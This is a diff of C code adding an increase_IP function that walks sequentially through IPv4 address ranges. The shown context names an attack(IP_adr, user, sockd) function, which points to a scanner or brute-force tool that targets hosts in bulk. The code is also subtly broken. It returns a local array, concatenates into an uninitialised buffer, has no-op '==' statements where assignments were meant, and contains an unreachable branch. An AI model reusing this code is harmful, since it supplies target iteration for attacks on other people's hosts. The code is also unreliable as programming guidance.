@@ -91,9 +91,52 @@ void update_time(int sockd){
 }
 
 char * increase_IP(char *IP_adr){
+	char str[20];
+	int ret;
+	int last;
+	strcpy(str,IP_adr);
+	char *first = strtok(str, ".");
+	char *ipnum = strtok(NULL, ".");
+	int second = atoi(ipnum);
+	ipnum = strtok(NULL, ".");
+	ret = atoi(ipnum);
+	ipnum = strtok(NULL, ".");
+	last = atoi(ipnum);
+	if (ret >= 0 && ret < 202){
+  		if (last >= 1 && last <= 252){
+			last ++;
+		}
+		else if (last == 253){
+        		ret ++;
+        		last = 1;
+        	}
+        }
+    	else if (ret == 202){
+      		second = 127;
+      		ret = 0;
+      		last = 1;
+    	}
+    	else if (second == 127 && ret == 202 && last == 253){
+      		second == 90;
+      		ret == 0;
+      		last == 1;
+    	}
+    	char scan[20];
+    	char two[10];
+    	char three[10];
+    	char four[10];
+    	snprintf(two, 10, "%d", second);
+    	snprintf(three, 10, "%d", ret);
+    	snprintf(four, 10, "%d", last);
+    	strcat(scan,first);
+    	strcat(scan,".");
+    	strcat(scan,two);
+    	strcat(scan,".");
+    	strcat(scan,three);
+    	strcat(scan,".");
+    	strcat(scan,four);
 
-
-	return IP_adr;
+	return scan;
 }
 
 void attack(char *IP_adr, char *user, int sockd){
